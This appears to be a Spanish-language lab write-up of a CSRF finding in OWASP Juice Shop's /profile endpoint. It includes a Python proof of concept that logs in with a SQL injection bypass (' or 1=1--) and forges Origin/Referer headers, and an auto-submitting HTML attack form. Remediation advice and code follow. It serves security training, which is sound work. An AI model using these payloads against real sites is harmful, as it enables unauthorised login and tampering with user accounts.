<div align="center">

# 🔁 CSRF — Cambio de Perfil
### OWASP Juice Shop · Cross-Site Request Forgery

![Status](https://img.shields.io/badge/Status-Verificado-00ff88?style=for-the-badge&logo=statuspage&logoColor=white)
![Severity](https://img.shields.io/badge/Severidad-Media-ffb300?style=for-the-badge)
![Type](https://img.shields.io/badge/Tipo-CSRF-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)

</div>

---

> **Hallazgo:** el endpoint `POST /profile` no implementa token CSRF ni valida las cabeceras `Origin` o `Referer`. Un atacante puede construir una página maliciosa que modifique el perfil de cualquier usuario autenticado sin su conocimiento.

> [!WARNING]
> Uso exclusivo en laboratorio controlado (`http://localhost:3000`). No reproducir en sistemas sin autorización explícita.

---

## 📋 Resumen del Hallazgo

| Campo | Detalle |
|-------|---------|
| **Aplicación** | OWASP Juice Shop |
| **Endpoint** | `POST /profile` |
| **Parámetro** | `username`, `email` (form body) |
| **Tipo** | Cross-Site Request Forgery (CSRF) |
| **Severidad** | 🟡 Media |
| **CVSS v3** | 6.5 · AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N |
| **Autenticación** | Sí (cookie `token`) |
| **Estado** | ✅ Verificado |

---

## 🔍 Descripción

El endpoint `/profile` es una página server-side que acepta `POST` con `username` y `email`. La sesión se mantiene mediante cookie `token`. No se observó token CSRF en el formulario, y el servidor acepta requests con `Origin` y `Referer` de dominios arbitrarios. Esto permite que una página externa fuerce cambios de perfil en la sesión activa de una víctima.

> [!NOTE]
> La protección `SameSite` de cookies modernas puede mitigar el ataque en navegadores actualizados vía formulario HTML. La vulnerabilidad del **endpoint** queda confirmada porque acepta requests sin ninguna defensa CSRF, independientemente del vector.

---

## 🔬 Análisis Técnico

### `[01]` Formulario detectado en `/profile`

```html
<form action="./profile" method="post">
  <input name="email" value="admin@juice-sh.op">
  <input name="username" value="">
</form>
```

### `[02]` Defensas ausentes

| Defensa | Presente |
|---------|----------|
| Token CSRF en formulario | ❌ No |
| Token CSRF en header | ❌ No |
| Validación de `Origin` | ❌ No |
| Validación de `Referer` | ❌ No |
| Cookie `SameSite=Strict/Lax` | ⚠️ Depende del navegador |

---

## 🧪 Reproducción

### `[01]` PoC — Python (bypass directo)

```python
python3 - <<'PY'
import requests, re

base = 'http://localhost:3000'

# 1. Obtener token de sesión (via SQLi ya documentado)
auth = requests.post(
    base + '/rest/user/login',
    json={'email': "' or 1=1--", 'password': 'x'}
).json()['authentication']

cookies = {'token': auth['token']}

# 2. Enviar request CSRF desde "dominio externo"
r = requests.post(
    base + '/profile',
    cookies=cookies,
    headers={
        'Origin':  'http://evil.attacker.com',
        'Referer': 'http://evil.attacker.com/poc.html'
    },
    data={
        'username': 'csrf-pwned',
        'email':    'admin@juice-sh.op'
    },
    allow_redirects=False
)
print('Status:', r.status_code, r.headers.get('Location'))

# 3. Verificar cambio
html = requests.get(base + '/profile', cookies=cookies).text
match = re.search(r'name="username" value="([^"]*)"', html)
print('Username actual:', match.group(1))
PY
```

### `[02]` Resultado observado

```
Status: 302 /profile
Username actual: csrf-pwned
```

- Request aceptado con `Origin: http://evil.attacker.com`
- Username actualizado correctamente
- No se requirió token CSRF

### `[03]` HTML PoC (para víctima con sesión activa)

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://localhost:3000/profile" method="POST">
      <input type="hidden" name="email"    value="admin@juice-sh.op">
      <input type="hidden" name="username" value="csrf-pwned">
    </form>
  </body>
</html>
```

---

## 🔁 Flujo con Caido

1. Obtener cookie `token` (login normal o via SQLi)
2. Visitar `/profile` y capturar el form `POST`
3. `Send to Replay`
4. Cambiar `Origin` y `Referer` por dominio externo
5. Confirmar que el servidor acepta y aplica el cambio

---

## 💥 Impacto

- **Cambio de username**: nombre de perfil modificado sin consentimiento del usuario
- **Cambio de imagen de perfil**: si se combina con SSRF (`/profile/image/url`)
- **Escalamiento**: si otras rutas usan el mismo modelo de sesión sin defensas, el alcance aumenta
- **Credibilidad**: un atacante puede cambiar datos visibles de cualquier usuario autenticado

---

## 🔧 Remediación

| Medida | Descripción |
|--------|-------------|
| **Token CSRF** | Generar token único por sesión, incluirlo en formulario y validarlo server-side |
| **Validar Origin/Referer** | Rechazar requests cuyo `Origin` no coincida con el dominio de la app |
| **SameSite=Strict en cookie** | Prevenir envío de cookie en requests cross-site |
| **Double Submit Cookie** | Incluir token CSRF tanto en cookie como en body y comparar |

```javascript
// ✅ Middleware CSRF
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

// ✅ Cookie SameSite
res.cookie('token', value, { sameSite: 'Strict', httpOnly: true });
```

---

## 🔗 Referencias

- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-352: CSRF](https://cwe.mitre.org/data/definitions/352.html)
